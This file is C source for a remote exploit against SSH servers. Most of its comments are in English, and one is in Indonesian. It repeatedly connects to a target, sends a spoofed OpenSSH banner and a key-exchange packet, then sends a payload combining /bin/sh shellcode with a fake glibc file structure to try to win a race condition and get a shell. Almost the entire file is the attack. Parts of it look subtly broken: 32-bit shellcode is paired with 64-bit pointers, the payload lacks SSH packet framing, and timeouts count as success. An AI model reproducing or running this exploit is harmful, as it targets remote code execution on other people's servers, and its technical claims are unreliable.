#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120

// Shellcode untuk menjalankan /bin/sh
unsigned char shellcode[] =
    "\x31\xc0"              // xor    %eax,%eax
    "\x50"                  // push   %eax
    "\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
    "\x89\xe3"              // mov    %esp,%ebx
    "\x50"                  // push   %eax
    "\x53"                  // push   %ebx
    "\x89\xe1"              // mov    %esp,%ecx
    "\x99"                  // cltd
    "\xb0\x0b"              // mov    $0xb,%al
    "\xcd\x80"              // int    $0x80
    ;

int setup_connection(const char *ip, int port);
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);
void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base);
int perform_ssh_handshake(int sock);


int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    double parsing_time = 0.5;
    int success = 0;

    uint64_t glibc_base = 0;
    char *glibc_base_str = getenv("GLIBC_BASE");
    if (glibc_base_str) {
        glibc_base = strtoull(glibc_base_str, NULL, 0);
        printf("[+] Using GLIBC_BASE from environment: 0x%lx\n", glibc_base);
    } else {
        fprintf(stderr, "[!] Error: GLIBC_BASE environment variable not set.\n");
        exit(1);
    }
    
    srand(time(NULL));

    for (int attempt = 0; attempt < 500 && !success; attempt++) {
        if (attempt % 50 == 0) {
            printf("[i] Attempt %d of 500...\n", attempt);
        }

        int sock = setup_connection(ip, port);
        if (sock < 0) {
            continue;
        }

        if (perform_ssh_handshake(sock) < 0) {
            close(sock);
            continue;
        }
        
        if (attempt_race_condition(sock, parsing_time, glibc_base)) {
            printf("\n[+] Race condition likely won! Waiting for shell...\n");
            success = 1;
            sleep(2);

            const char *cmd = "uname -a; id\n";
            printf("[+] Sending command: %s", cmd);
            send(sock, cmd, strlen(cmd), 0);

            char buffer[4096];
            memset(buffer, 0, sizeof(buffer));
            
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
            
            ssize_t bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received > 0) {
                printf("[+] Output from target:\n\n%s\n", buffer);
            } else if (bytes_received == 0) {
                printf("[!] Connection closed by target.\n");
            }
            
            break;
        }

        close(sock);
        usleep(50000);
    }
    
    return !success;
}

int setup_connection(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

int perform_ssh_handshake(int sock) {
    const char *ssh_version = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n";
    if (send(sock, ssh_version, strlen(ssh_version), 0) < 0) return -1;

    char buffer[256];
    ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0 || strstr(buffer, "SSH-2.0") == NULL) return -1;

    unsigned char kexinit_payload[36];
    memset(kexinit_payload, 0, sizeof(kexinit_payload));
    size_t packet_len = 1 + sizeof(kexinit_payload);
    size_t padding_len = 8 - (packet_len % 8);
    if (padding_len < 4) padding_len += 8;

    char packet[128];
    *(uint32_t*)packet = htonl(packet_len + padding_len - 1);
    packet[4] = padding_len;
    packet[5] = 20; // SSH_MSG_KEXINIT
    memcpy(packet + 6, kexinit_payload, sizeof(kexinit_payload));
    if(send(sock, packet, 6 + sizeof(kexinit_payload) + padding_len, 0) < 0) return -1;
    
    if (recv(sock, buffer, sizeof(buffer), 0) <= 0) return -1;
    
    return 0;
}

void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base) {
    memset(data, 0, size);
    
    uint64_t* p = (uint64_t*)data;
    
    // Fake _IO_FILE_plus structure for glibc
    // This part is highly specific to the glibc version
    p[0] = 0xfbad2488;
    p[3] = (uint64_t)data + sizeof(shellcode); // _IO_write_base
    p[4] = (uint64_t)data + sizeof(shellcode); // _IO_write_ptr
    
    void *vtable_ptr = (void*)(glibc_base + 0x21b740); // _IO_wfile_jumps
    p[15] = (uint64_t)data + 0xd8 - sizeof(void*); // _chain
    *(void**)(data + 0xd8) = vtable_ptr;
}


int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base) {
    unsigned char final_packet[MAX_PACKET_SIZE];
    
    create_fake_file_structure(final_packet, sizeof(final_packet), glibc_base);
    memcpy(final_packet, shellcode, sizeof(shellcode));

    if (send(sock, final_packet, sizeof(final_packet) - 1, 0) < 0) {
        return 0;
    }

    usleep(1000); // Small delay

    if (send(sock, &final_packet[sizeof(final_packet) - 1], 1, 0) < 0) {
        return 0;
    }

    char response[1024];
    ssize_t received = recv(sock, response, sizeof(response), MSG_DONTWAIT);
    
    if (received < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
        return 1;
    }
    if (received == 0) {
        return 1;
    }
    
    return 0;
}
